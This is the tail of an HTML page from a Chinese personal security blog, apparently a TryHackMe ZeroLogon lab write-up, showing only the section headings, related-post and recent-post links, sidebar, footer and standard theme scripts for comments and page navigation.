class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-28</div><div class="title">THMPrintNightmare</div></div></a></div><div><a href="/2023/09/29/THMWindowsPrivEsc%E6%88%BF%E9%97%B4walkthrough/" title="THMWindowsPrivEsc房间walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-29</div><div class="title">THMWindowsPrivEsc房间walkthrough</div></div></a></div><div><a href="/2024/08/01/THMWindowsLocalPersistence/" title="THMWindowsLocalPersistence"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="title">THMWindowsLocalPersistence</div></div></a></div><div><a href="/2024/07/31/THMWindowsPrivilegeEscalation/" title="THMWindowsPrivilegeEscalation"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">THMWindowsPrivilegeEscalation</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#The-Zero-Day-Angle"><span class="toc-number">1.</span> <span class="toc-text">The Zero Day Angle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impacket-Installation"><span class="toc-number">2.</span> <span class="toc-text">Impacket Installation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-Proof-of-Concept"><span class="toc-number">3.</span> <span class="toc-text">The Proof of Concept</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-It-Up-Lab-It-Up%EF%BC%81"><span class="toc-number">4.</span> <span class="toc-text">Lab It Up!Lab It Up！</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/04/30/THMZeroLogon/'
+    this.page.identifier = '/2024/04/30/THMZeroLogon/'
+    this.page.title = 'THMZeroLogon'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
